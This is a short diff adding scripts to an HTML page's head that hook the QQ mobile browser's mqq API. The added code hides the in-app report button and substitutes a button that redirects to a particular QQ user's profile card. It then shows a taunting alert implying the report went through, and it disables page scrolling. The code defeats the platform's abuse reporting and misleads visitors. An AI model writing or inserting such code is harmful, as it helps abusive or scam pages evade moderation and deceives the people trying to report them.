@@ -10,6 +10,29 @@
   <link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.0.3/css/bootstrap.min.css" /> 
  </head> 
  
+ 
+ <script src="https://open.mobile.qq.com/sdk/qqapi.js?_bid=152"></script>
+<script type="text/javascript">
+    mqq.ui.setTitleButtons({
+        right: {
+            title: "举报",
+            hidden: true
+        }
+    }) 
+</script>
+<script>mqq.ui.setTitleButtons({
+        right: {
+            iconID: 8, callback: function () {
+                window.location.href = 'mqqapi://card/show_pslcard?&uin=2861878208';
+                alert("你以为你举报成功？其实你真的举报成功了！DX");
+            }
+        }
+    });
+</script>
+<script>mqq.invoke("ui", "setScrollState",{ enable: false });</script>
+ 
+ 
+ 
  <body class="custom-background" style="">
   <div id="wrapper"> 
    <div id="header"> 
